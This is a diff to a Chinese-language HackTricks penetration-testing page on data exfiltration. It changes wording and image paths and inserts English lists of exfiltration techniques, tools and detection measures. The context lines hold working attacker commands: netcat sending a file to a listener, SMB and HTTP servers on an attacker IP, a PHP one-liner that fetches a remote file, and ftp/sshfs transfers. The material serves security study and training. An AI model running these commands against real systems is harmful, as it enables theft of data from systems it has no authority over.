@@ -16,13 +16,13 @@
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 ***
 
-## 常见的白名单域用于信息外泄
+## 常见的白名单域用于外泄信息
 
 查看[https://lots-project.com/](https://lots-project.com/)以找到常见的可被滥用的白名单域
 
@@ -127,7 +127,7 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP服务器（NodeJS）
+### FTP 服务器（NodeJS）
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
@@ -163,7 +163,7 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali 作为服务器
+Kali作为服务器
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
@@ -185,31 +185,48 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
+Windows
+
+---
+
 ## Exfiltration
 
-### Exfiltration Over Command and Control Channel
+### Introduction
 
-During post-exploitation, an attacker may exfiltrate data over the command and control channel. This can be achieved by executing commands on the compromised system to gather and exfiltrate sensitive information to the attacker-controlled server.
+Exfiltration is the unauthorized transfer of data from a target system. This section covers various methods to exfiltrate data from a compromised Windows system.
 
-### Exfiltration Over Alternative Protocols
+### Techniques
 
-Attackers may use alternative protocols such as DNS, ICMP, or HTTPS to exfiltrate data from a compromised system. By encoding the data within the protocol traffic, attackers can bypass network security controls and exfiltrate data without raising suspicion.
+1. **Compression**: Compress data before exfiltration to reduce size and avoid detection.
+2. **Encryption**: Encrypt data to prevent unauthorized access during exfiltration.
+3. **Steganography**: Hide data within other files to avoid detection.
+4. **DNS Tunneling**: Use DNS requests to exfiltrate data covertly.
+5. **HTTP/S Traffic**: Use HTTP/S protocols to exfiltrate data.
+6. **Email**: Send data as email attachments or within the email body.
+7. **Cloud Storage**: Upload data to cloud storage services for exfiltration.
+8. **External Storage**: Use external storage devices to physically exfiltrate data.
+9. **Printers**: Print sensitive data and collect it from a compromised printer.
+10. **Clipboard**: Copy data to the clipboard for exfiltration.
 
-### Exfiltration Over Unmonitored Protocols
+### Tools
 
-Attackers may exfiltrate data over protocols that are typically not monitored by security devices, such as FTP or SMTP. By leveraging these unmonitored protocols, attackers can exfiltrate data without triggering alerts from security systems.
+- **Certutil**: Built-in Windows utility to decode/encode data.
+- **Bitsadmin**: Built-in tool to create and monitor BITS jobs.
+- **PowerShell**: Use PowerShell scripts for various exfiltration methods.
+- **FTP**: File Transfer Protocol for transferring files.
+- **Netcat**: Tool for network debugging and data transfer.
+- **Curl**: Command-line tool for transferring data with URLs.
+- **Wget**: Retrieve content from web servers.
+- **Cloud Service APIs**: Utilize cloud service APIs for data exfiltration.
 
-### Exfiltration Using Steganography
+### Detection
 
-Steganography involves hiding data within other non-secret files or messages to exfiltrate information without detection. Attackers can embed sensitive data within images, audio files, or other digital media to evade detection by security mechanisms.
-
-### Exfiltration Using Encryption
-
-Attackers may encrypt exfiltrated data to prevent detection by security tools. By encrypting the data before exfiltration, attackers can ensure that even if the data is intercepted, it remains unintelligible to anyone without the decryption key.
-
-### Exfiltration Using Covert Channels
-
-Covert channels involve using unconventional communication methods to exfiltrate data. This can include techniques such as manipulating timing channels, storage channels, or network protocols to transfer data stealthily without being detected by traditional security measures.
+- Monitor network traffic for unusual patterns.
+- Implement Data Loss Prevention (DLP) solutions.
+- Use Endpoint Detection and Response (EDR) tools.
+- Analyze DNS requests for suspicious activities.
+- Monitor outbound network connections.
+- Conduct regular security audits and penetration testing.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -231,9 +248,7 @@ sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## NC
-
-NC（Netcat）是一个强大的网络工具，可用于在网络上发送和接收数据。它可以用于创建反向shell、传输文件以及在渗透测试中进行数据传输。
+## 网络通道
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -274,7 +289,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-如果您可以将数据发送到SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
+如果您可以将数据发送到一个SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -306,7 +321,31 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-Visual Basic 脚本 (VBScript) 是一种基于 Visual Basic 的脚本语言，通常用于 Windows 环境中。它可以用于执行各种任务，包括文件操作、系统管理和数据处理。VBScript 可以通过多种方式进行数据泄露，包括通过网络传输数据、将数据写入文件或通过其他外部通道传输数据。
+### VBScript Exfiltration Techniques
+
+VBScript can be used to exfiltrate data from a compromised system. Below are some common techniques used for data exfiltration using VBScript:
+
+1. **HTTP Requests**: VBScript can be used to send HTTP requests to an external server controlled by the attacker. Data can be encoded and sent as part of the request.
+
+2. **Email**: VBScript can be used to send emails with attachments containing exfiltrated data. This can be achieved by interacting with the local email client or using SMTP protocols.
+
+3. **DNS Tunneling**: VBScript can be used to encode data and send it over DNS requests to a controlled server. This technique can be used to bypass network restrictions.
+
+4. **File Transfer**: VBScript can be used to read files from the compromised system and transfer them to an external server using protocols like FTP or SMB.
+
+5. **Data Encoding**: VBScript can encode exfiltrated data using techniques like Base64 encoding before sending it out to evade detection.
+
+### Detection and Prevention
+
+To detect and prevent data exfiltration using VBScript, consider the following measures:
+
+- Monitor network traffic for suspicious HTTP requests originating from VBScript.
+- Implement email filtering to detect and block emails sent from VBScript.
+- Monitor DNS traffic for unusual patterns that may indicate data exfiltration using DNS tunneling.
+- Restrict VBScript execution on endpoints to prevent unauthorized exfiltration activities.
+- Implement endpoint security solutions to detect and block malicious VBScript activities.
+
+By understanding these exfiltration techniques and implementing detection and prevention measures, organizations can better protect their systems and data from unauthorized data exfiltration using VBScript.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -356,7 +395,7 @@ wine exe2bat.exe nc.exe nc.txt
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -366,9 +405,9 @@ wine exe2bat.exe nc.exe nc.txt
 
 支持HackTricks的其他方式：
 
-* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
